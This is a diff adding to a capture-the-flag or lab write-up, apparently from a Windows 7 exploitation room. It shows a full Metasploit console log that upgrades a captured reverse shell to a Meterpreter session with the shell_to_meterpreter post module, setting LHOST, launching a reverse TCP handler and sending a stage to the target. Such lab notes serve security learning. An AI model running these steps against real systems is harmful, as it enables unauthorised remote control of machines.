@@ -336,3 +336,64 @@ C:\Windows\system32>
 > [!important]
 > If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)
 
+> [!note]
+> Googled:
+This command will attempt to launch a new Meterpreter session automatically. 
+Method 2: Using the shell_to_meterpreter Module 
+Background the current shell (Ctrl+Z).
+Load the post-exploitation module - use post/multi/manage/shell_to_meterpreter
+
+```
+msf > sessions -l
+
+Active sessions
+===============
+  Id  Name  Type               Information                                               Connection
+  --  ----  ----               -----------                                               ----------
+  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  192.168.144.173:4444 -> 10.67.147.22:49195 (10.67.147.22)
+msf > use post/multi/manage/shell_to_meterpreter
+[*] Using configured payload windows/x64/shell/reverse_tcp
+msf post(multi/manage/shell_to_meterpreter) > show options
+Module options (post/multi/manage/shell_to_meterpreter):
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on
+View the full module info with the info, or info -d command.
+msf post(multi/manage/shell_to_meterpreter) > set LHOST 192.168.144.173
+LHOST => 192.168.144.173
+msf post(multi/manage/shell_to_meterpreter) > session -l
+[-] Unknown command: session. Did you mean sessions? Run the help command for more details.
+msf post(multi/manage/shell_to_meterpreter) > sessions -l
+Active sessions
+===============
+
+  Id  Name  Type               Information                                               Connection
+  --  ----  ----               -----------                                               ----------
+  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  192.168.144.173:4444 -> 10.67.147.22:49195 (10.67.147.22)
+
+msf post(multi/manage/shell_to_meterpreter) > set SESSION 1
+SESSION => 1
+msf post(multi/manage/shell_to_meterpreter) > exploit
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.168.144.173:4433 
+[*] Sending stage (203846 bytes) to 10.67.147.22
+[*] Post module execution completed
+msf post(multi/manage/shell_to_meterpreter) > sessions -l
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                               Connection
+  --  ----  ----                     -----------                                               ----------
+  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  192.168.144.173:4444 -> 10.67.147.22:49195 (10.67.147.22)
+  2         meterpreter x64/windows                                                            192.168.144.173:4433 -> 10.67.147.22:49197 (10.67.147.22)
+
+msf post(multi/manage/shell_to_meterpreter) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > 
+
+```
